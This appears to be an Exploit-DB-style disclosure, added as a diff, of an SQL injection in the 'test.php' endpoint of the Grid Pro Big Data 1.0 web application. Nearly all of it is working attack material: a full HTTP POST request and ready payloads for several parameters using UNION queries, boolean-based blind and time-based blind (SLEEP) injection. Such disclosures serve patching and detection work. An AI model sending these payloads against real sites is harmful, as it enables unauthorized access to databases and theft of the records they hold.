@@ -1,0 +1,61 @@
+# Exploit Title: Grid Pro Big Data 1.0 - 'test.php' SQL Injection
+# Dork: N/A
+# Date: 30.05.2018
+# Exploit Author: Kağan Çapar
+# Vendor Homepage: https://codecanyon.net/item/grid-pro-big-data-table-view-data-grid-with-sort-search-and-filter-for-large-mysql-tables/20395348
+
+# Version: 1.0
+# Category: Webapps
+# Tested on: Kali Linux
+# Description : The multiple parameters in the 'test.php' query contain
+SQLi vulnerabilities.
+====================================================
+# PoC : SQLi :
+
+
+POST /release/pro_grid_big_data/php/test.php HTTP/1.1
+Host: site.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
+Firefox/52.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://site.com/release/pro_grid_big_data/index.html
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 430
+Connection: keep-alive
+page=1&on_home=5&table_name=be&params%5B0%5D%5Btype%5D=text&params%5B0%5D%5Bvalue%5D=&params%5B0%5D%5Bname%5D=Name&params%5B1%5D%5Btype%5D=text&params%5B1%5D%5Bvalue%5D=&params%5B1%5D%5Bname%5D=Surname&params%5B2%5D%5Btype%5D=num_range&params%5B2%5D%5Bvalue%5D%5B%5D=&params%5B2%5D%5Bvalue%5D%5B%5D=&params%5B2%5D%5Bname%5D=Age&params%5B3%5D%5Btype%5D=date&params%5B3%5D%5Bvalue%5D=&params%5B3%5D%5Bname%5D=Born_date&ordering=none
+
+
+Parameter: on_home (POST)
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: page=2&on_home=5 UNION ALL SELECT
+CONCAT(CONCAT('qjbqq','vVWAgYsZnIsAkqERYDgZibFieBTaDlfAymtKvnaO'),'qxbpq'),NULL,NULL,NULL--
+LEgG&table_name=be&params[0][type]=text&params[0][value]=&params[0][name]=Name&params[1][type]=text&params[1][value]=&params[1][name]=Surname&params[2][type]=num_range&params[2][value][]=&params[2][value][]=&params[2][name]=Age&params[3][type]=date&params[3][value]=&params[3][name]=Born_date&ordering=none
+
+Parameter: params[0][value] (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload:
+page=2&on_home=5&table_name=be&params[0][type]=text&params[0][value]=%' AND
+1906=1906 AND
+'%'='&params[0][name]=Name&params[1][type]=text&params[1][value]=&params[1][name]=Surname&params[2][type]=num_range&params[2][value][]=&params[2][value][]=&params[2][name]=Age&params[3][type]=date&params[3][value]=&params[3][name]=Born_date&ordering=none
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload:
+page=2&on_home=5&table_name=be&params[0][type]=text&params[0][value]=%' AND
+SLEEP(5) AND
+'%'='&params[0][name]=Name&params[1][type]=text&params[1][value]=&params[1][name]=Surname&params[2][type]=num_range&params[2][value][]=&params[2][value][]=&params[2][name]=Age&params[3][type]=date&params[3][value]=&params[3][name]=Born_date&ordering=none
+
+Parameter: params[0][name] (POST)
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload:
+page=2&on_home=5&table_name=be&params[0][type]=text&params[0][value]=&params[0][name]=Name)
+AND SLEEP(5) AND
+(2977=2977&params[1][type]=text&params[1][value]=&params[1][name]=Surname&params[2][type]=num_range&params[2][value][]=&params[2][value][]=&params[2][name]=Age&params[3][type]=date&params[3][value]=&params[3][name]=Born_date&ordering=none
+
+====================================================
